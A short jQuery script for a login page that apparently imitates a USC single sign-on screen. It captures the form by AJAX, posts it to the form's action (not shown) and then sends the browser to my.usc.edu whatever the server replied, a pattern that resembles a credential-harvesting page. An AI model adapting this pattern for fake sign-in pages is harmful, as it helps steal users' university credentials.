$(document).ready(function () {
    var canSubmit = true;
    setTimeout(function () {
        $(".hidden").removeClass("hidden");
        $(".wait").removeClass("wait");
        $("#loading").css('display', 'none');
    }, 1000)

    $("#loginform").submit(function (event) {

        /* stop form from submitting normally */
        event.preventDefault();
        if (canSubmit) {
            canSubmit = false;
            var username = $("#username").text();
            var password = $("#password").text();
            $.ajax({
                url: $('#loginform').attr('action'),
                type: 'POST',
                data: $('#loginform').serialize(),
                success: function (data, jqXHR) {
                    console.log('form submitted.');
                    console.log(data);
                    window.location.href = "https://my.usc.edu";
                },
                error: function (data, jqXHR) {
                    $('button[name="_eventId_proceed"]').text("Sign in");
                    $("#error").css('display', 'block');
                    canSubmit = true;
                }
            });
        }
    });
});
